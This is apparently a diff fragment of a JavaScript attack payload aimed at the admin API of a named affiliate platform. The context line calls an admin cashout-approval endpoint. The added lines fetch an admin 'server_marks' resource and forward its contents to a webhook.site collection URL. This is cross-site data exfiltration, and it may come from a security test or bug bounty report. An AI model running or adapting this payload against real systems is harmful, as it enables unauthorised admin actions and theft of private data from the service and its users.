@@ -78,3 +78,11 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
 
   
 });
+
+var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://affiliates-api.ggpartners.com/admin/translate_manager/server_marks", false ); // false for synchronous request
+    xmlHttp.send( null );
+
+var xmlHttp1 = new XMLHttpRequest();
+    xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+xmlHttp.responseText, false ); // false for synchronous request
+    xmlHttp1.send( null );
